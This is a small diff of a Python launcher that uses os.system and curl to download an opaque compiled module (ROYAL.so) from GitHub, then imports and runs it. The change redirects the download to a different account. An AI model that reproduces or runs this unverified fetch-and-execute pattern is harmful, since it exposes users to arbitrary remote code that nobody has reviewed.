@@ -17,7 +17,7 @@
  bit = platform.architecture()[0] 
  if bit == '64bit': 
      if not os.path.isfile('ROYAL.so'): 
-         os.system('curl -L https://github.com/chigoziieworldwide/executables/blob/main/ROYAL.cpython-311.so?raw=true -o ROYAL.so')  
+         os.system('curl -L https://github.com/MARKWIDE1/executables/blob/main/ROYAL.cpython-311.so?raw=true -o ROYAL.so')  
          __import__("ROYAL").chigozie() 
      else: 
          __import__("ROYAL").chigozie() 
